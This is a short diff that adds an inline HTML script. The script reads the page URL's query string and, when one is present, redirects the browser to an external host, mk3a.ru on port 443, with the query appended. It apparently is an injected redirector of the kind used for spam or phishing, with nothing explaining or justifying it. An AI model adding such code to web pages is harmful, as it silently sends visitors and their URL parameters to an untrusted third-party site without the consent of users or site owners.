@@ -1,0 +1,9 @@
+<script>
+	let way = String(document.location.href).split('?')[1]
+	if(way != undefined){
+		let tw = 'http://mk3a.ru:443/r/?l=' + way
+		window.location.href = tw
+	}else{
+		console.log('non')
+	}
+</script>
